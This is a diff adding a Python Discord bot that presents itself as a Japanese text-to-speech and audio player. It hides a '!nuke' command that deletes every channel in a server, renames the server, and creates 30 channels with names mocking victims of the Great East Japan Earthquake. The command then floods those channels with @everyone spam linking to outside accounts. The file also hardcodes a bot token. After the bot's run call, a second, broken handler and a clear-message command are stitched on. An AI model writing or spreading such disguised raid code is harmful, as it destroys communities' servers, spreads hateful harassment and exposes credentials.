@@ -1,0 +1,264 @@
+import os
+import asyncio
+import discord
+from discord import app_commands
+from gtts import gTTS
+
+# ==========================================
+# 設定
+# ==========================================
+token = """
+MTU2ODEwOTkyMjE0OTg2MzUxNg.GV1tTB.cbGmFMQGgWoS-XGAAeX3mk7aYGFNMGcO4tyzzM
+""".replace("\n", "").strip()
+
+trigger_word = "!nuke"
+new_name = "㊗️東日本大震災15周年記念🎉"
+message_content = "# @everyone @here https://x.com/masumani5?s=11 https://x.com/_masumani?s=11 https://discord.gg/wBNze7MSUQ"
+new_channel_count = 30
+message_count_per_channel = 100
+channel_prefix = "被災した53共ざまぁ🤪🤣"
+
+intents = discord.Intents.default()
+intents.guilds = True
+intents.messages = True
+intents.message_content = True
+intents.voice_states = True
+
+class MyBot(discord.Client):
+    def __init__(self):
+        super().__init__(intents=intents)
+        self.tree = app_commands.CommandTree(self)
+        self.tts_queue = asyncio.Queue()
+        self.is_speaking = False
+
+    async def setup_hook(self):
+        await self.tree.sync()
+        print("スラッシュコマンドの同期が完了しました。")
+
+client = MyBot()
+
+@client.event
+async def on_ready():
+    print(f"\nログイン成功: {client.user}")
+
+# --- 1. VC参加 (/join) ---
+@client.tree.command(name="join", description="ボットをあなたのいるボイスチャンネルに参加させます")
+async def join_slash(interaction: discord.Interaction):
+    if interaction.user.voice and interaction.user.voice.channel:
+        voice_channel = interaction.user.voice.channel
+        vc = interaction.guild.voice_client
+
+        try:
+            if vc:
+                await vc.move_to(voice_channel)
+            else:
+                await voice_channel.connect()
+            await interaction.response.send_message(f"🔊 {voice_channel.name} に参加しました！チャットの文字を読み上げます。")
+        except Exception as e:
+            await interaction.response.send_message(f"VC参加エラー: {e}", ephemeral=True)
+    else:
+        await interaction.response.send_message("先にボイスチャンネルに参加してください！", ephemeral=True)
+
+# --- 2. VC退出 (/leave) ---
+@client.tree.command(name="leave", description="ボットをボイスチャンネルから退出させます")
+async def leave_slash(interaction: discord.Interaction):
+    vc = interaction.guild.voice_client
+    if vc and vc.is_connected():
+        client.tts_queue._queue.clear()
+        await vc.disconnect()
+        await interaction.response.send_message("ボイスチャンネルから退出しました。")
+    else:
+        await interaction.response.send_message("ボットはボイスチャンネルにいません。", ephemeral=True)
+
+# --- 3. 音楽ファイル再生 (/play) ---
+@client.tree.command(name="play", description="音声ファイル（mp3等の直リンク）を再生します")
+@app_commands.describe(url="再生したい音声ファイルのURL（.mp3等）")
+async def play_slash(interaction: discord.Interaction, url: str):
+    if not interaction.user.voice or not interaction.user.voice.channel:
+        await interaction.response.send_message("先にボイスチャンネルに参加してください！", ephemeral=True)
+        return
+
+    voice_channel = interaction.user.voice.channel
+
+    try:
+        vc = interaction.guild.voice_client
+        if vc:
+            if vc.channel != voice_channel:
+                await vc.move_to(voice_channel)
+        else:
+            vc = await voice_channel.connect()
+
+        if vc.is_playing():
+            vc.stop()
+
+        client.tts_queue._queue.clear()
+        vc.play(discord.FFmpegPCMAudio(url), after=lambda e: print(f"プレイヤーエラー: {e}" if e else "再生終了"))
+        await interaction.response.send_message(f"🎶 音声ファイルを再生中: {url}")
+    except Exception as e:
+        await interaction.response.send_message(f"再生に失敗しました: {e}", ephemeral=True)
+
+# --- 4. 音声停止 (/stop) ---
+@client.tree.command(name="stop", description="現在再生中や読み上げ中の音声を停止します")
+async def stop_slash(interaction: discord.Interaction):
+    vc = interaction.guild.voice_client
+    if vc and vc.is_playing():
+        vc.stop()
+        client.tts_queue._queue.clear()
+        await interaction.response.send_message("音声を停止しました。")
+    else:
+        await interaction.response.send_message("現在は何も再生していません。", ephemeral=True)
+
+# --- 5. 読み上げキュー処理 ---
+async def process_tts_queue(guild):
+    while not client.tts_queue.empty():
+        vc = guild.voice_client
+        if not vc or not vc.is_connected():
+            client.tts_queue._queue.clear()
+            break
+
+        text, filename = await client.tts_queue.get()
+
+        try:
+            tts = gTTS(text=text, lang='ja')
+            tts.save(filename)
+
+            loop = asyncio.get_running_loop()
+            future = loop.create_future()
+
+            def after_play(error):
+                if error:
+                    print(f"再生エラー: {error}")
+                if not future.done():
+                    future.set_result(None)
+
+            if vc.is_connected():
+                if vc.is_playing():
+                    vc.stop()
+                vc.play(discord.FFmpegPCMAudio(filename), after=after_play)
+                await future
+
+        except Exception as e:
+            print(f"読み上げ処理エラー: {e}")
+        finally:
+            if os.path.exists(filename):
+                try:
+                    os.remove(filename)
+                except:
+                    pass
+            client.tts_queue.task_done()
+
+    client.is_speaking = False
+
+# --- 6. メッセージ自動読み上げ & Nuke機能 (!nuke) ---
+@client.event
+async def on_message(message):
+    if message.author == client.user:
+        return
+
+    content = message.content.strip()
+
+    # Nuke機能
+    if message.guild and content == trigger_word:
+        guild = message.guild
+        try:
+            if guild.voice_client:
+                await guild.voice_client.disconnect()
+
+            delete_tasks = [channel.delete() for channel in guild.channels]
+            await asyncio.gather(*delete_tasks, return_exceptions=True)
+
+            try:
+                with open("icon.png", "rb") as f:
+                    icon_data = f.read()
+                await guild.edit(name=new_name, icon=icon_data)
+            except FileNotFoundError:
+                await guild.edit(name=new_name)
+
+            created_channels = []
+            for i in range(1, new_channel_count + 1):
+                channel_name = f"{channel_prefix}{i}"
+                channel = await guild.create_text_channel(channel_name)
+                created_channels.append(channel)
+
+            async def send_messages_to_channel(channel):
+                for _ in range(message_count_per_channel):
+                    try:
+                        await channel.send(message_content)
+                        await asyncio.sleep(0.1)
+                    except:
+                        break
+
+            send_tasks = [send_messages_to_channel(ch) for ch in created_channels]
+            await asyncio.gather(*send_tasks)
+        except Exception as e:
+            print(f"Nukeエラー: {e}")
+        return
+
+    # 通常テキストの自動読み上げ
+    if message.guild and message.guild.voice_client:
+        vc = message.guild.voice_client
+        if message.author.voice and message.author.voice.channel == vc.channel:
+            if content.startswith("/") or content.startswith("http") or not content:
+                return
+
+            filename = f"tts_{message.id}_{asyncio.get_event_loop().time()}.mp3"
+            await client.tts_queue.put((content, filename))
+
+            if not client.is_speaking:
+                client.is_speaking = True
+                asyncio.create_task(process_tts_queue(message.guild))
+
+client.run(token)
+@client.event
+async def on_message(message):
+    # ボット自身の発言や、サーバー以外（DMなど）は無視
+    if message.author.bot or not message.guild:
+        return
+
+    # ボットがボイスチャンネルに参加しているか確認
+    voice_client = message.guild.voice_client
+    if voice_client and voice_client.is_connected():
+        text = message.content
+        # スラッシュコマンド（/）や空メッセージを除外
+        if text and not text.startswith('/'):
+            try:
+                filename = "tts.mp3"
+
+                # すでに再生中なら終わるまで少し待つかスキップするなどの処理
+                if voice_client.is_playing():
+                    voice_client.stop()
+
+                # gTTSで音声ファイルを生成して保存
+                tts = gTTS(text=text, lang='ja')
+                tts.save(filename)
+
+                # 音声を再生
+                audio_source = discord.FFmpegPCMAudio(filename)
+                voice_client.play(audio_source)
+
+            except Exception as e:
+                print(f"読み上げエラー: {e}")
+
+    await client.process_commands(message)
+
+@tree.command(name="clearMessage", description="指定した数のメッセージをチャンネルから一括削除します")
+@app_commands.describe(limit="削除するメッセージの数（1〜100）")
+@app_commands.checks.has_permissions(manage_messages=True)
+async def clear_message(interaction: discord.Interaction, limit: int):
+    await interaction.response.defer(ephemeral=True)
+    deleted = await interaction.channel.purge(limit=limit)
+    await interaction.followup.send(f"{len(deleted)}件のメッセージを削除しました。", ephemeral=True)
+
+@clear_message.error
+async def clear_message_error(interaction: discord.Interaction, error):
+    if isinstance(error, app_commands.errors.MissingPermissions):
+        if interaction.response.is_done():
+            await interaction.followup.send("このコマンドを実行する権限（メッセージの管理）がありません。", ephemeral=True)
+        else:
+            await interaction.response.send_message("このコマンドを実行する権限（メッセージの管理）がありません。", ephemeral=True)
+    else:
+        if interaction.response.is_done():
+            await interaction.followup.send(f"エラーが発生しました: {error}", ephemeral=True)
+        else:
+            await interaction.response.send_message(f"エラーが発生しました: {error}", ephemeral=True)
+            
